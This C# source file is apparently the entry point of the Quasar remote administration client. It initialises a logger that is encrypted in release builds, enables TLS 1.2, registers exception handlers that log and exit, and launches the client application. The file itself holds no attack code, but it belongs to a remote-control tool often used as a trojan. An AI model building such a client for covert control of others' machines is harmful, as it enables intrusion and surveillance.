using Quasar.Client.Config;
using Quasar.Client.IO;
using Quasar.Common.Logger;
using System;
using System.Diagnostics;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client
{
    internal static class Program
    {
        [STAThread]
        private static void Main(string[] args)
        {
            #if DEBUG
                bool encryptLogs = false;
            #else
                bool encryptLogs = true;
            #endif

            Logger.InitializeLogger(Settings.LOGFILE, encryptLogs : encryptLogs);
            
            // enable TLS 1.2
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            Logger.Debug("Enabled TLS 1.2.");

            // Set the unhandled exception mode to force all Windows Forms errors to go through our handler
            Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);

            // Add the event handler for handling UI thread exceptions
            Application.ThreadException += HandleThreadException;

            // Add the event handler for handling non-UI thread exceptions
            AppDomain.CurrentDomain.UnhandledException += HandleUnhandledException;

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Logger.Debug("Starting application...");
            Application.Run(new QuasarApplication());
        }

        private static void HandleThreadException(object sender, ThreadExceptionEventArgs e)
        {
            Debug.WriteLine(e);
            Logger.Error(e.Exception.ToString());
            Environment.Exit(1);
        }

        /// <summary>
        /// Handles unhandled exceptions by restarting the application and hoping that they don't happen again.
        /// </summary>
        /// <param name="sender">The source of the unhandled exception event.</param>
        /// <param name="e">The exception event arguments. </param>
        private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            Logger.Error(e.ExceptionObject.ToString());
            if (e.IsTerminating)
            {
                Debug.WriteLine(e);
                Environment.Exit(1);
            }
        }
    }
}
